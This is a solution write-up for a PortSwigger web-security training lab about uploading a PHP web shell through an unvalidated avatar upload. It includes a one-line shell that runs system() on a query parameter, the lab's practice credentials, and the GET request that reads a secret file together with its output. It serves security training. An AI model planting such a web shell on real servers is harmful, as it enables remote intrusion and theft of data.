# [Lab: Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

## Lab

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file  `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials:  `wiener:peter`

## Solution

1. login to wiener account

2. upload test.php file at upload avatar function:

    ```php
    <?php echo system($_GET['command']); ?>
    ```

3. Select `open image in new tab` to get image's link: <https://lab-id.web-security-academy.net/files/avatars/test.php>

4. Access shellcode

    ```http
    GET /files/avatars/test.php?command=cat+/home/carlos/secret HTTP/1.1
    ```

    result:

    ```text
    9XwzsPBUTwpv6bLESRqLTK11EE1WC5Mg9XwzsPBUTwpv6bLESRqLTK11EE1WC5Mg
    ```

    flag is repeated twice?
